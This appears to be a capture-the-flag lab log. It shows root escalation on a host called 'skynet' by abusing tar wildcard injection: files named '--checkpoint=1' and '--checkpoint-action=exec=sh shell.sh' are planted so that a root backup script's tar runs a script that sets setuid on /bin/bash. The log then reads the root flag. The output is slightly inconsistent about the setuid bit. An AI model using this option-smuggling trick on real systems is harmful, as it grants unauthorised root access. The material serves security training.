# Privilege Esc via Wildcard Injection (Tar Checkpoint Abuse)

```bash
bash-4.3# ls backups/
backup.sh  backup.tgz

bash-4.3# cat backups/backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

www-data@skynet:/var/www/html$ echo 'chmod u+s /bin/bash' > shell.sh

www-data@skynet:/var/www/html$ chmod +x shell.sh

www-data@skynet:/var/www/html$ touch -- '--checkpoint=1'

www-data@skynet:/var/www/html$ touch -- '--checkpoint-action=exec=sh shell.sh'

www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun  3 11:25 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     0 Jun  3 11:25 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun  3 11:25 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data    20 Jun  3 11:25 shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-rw-rw- 1 www-data www-data     0 Jun  3 11:25 test

www-data@skynet:/var/www/html$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash

www-data@skynet:/var/www/html$ /bin/bash -p
bash-4.3# ls
--checkpoint-action=exec=sh shell.sh  admin   css         js         test
--checkpoint=1                        ai      image.png   shell.sh
45kra24zxs28v3yd                      config  index.html  style.css
bash-4.3# cat /root/root.txt 
3f0372db24753accc7179a282cd6a949
bash-4.3# 

```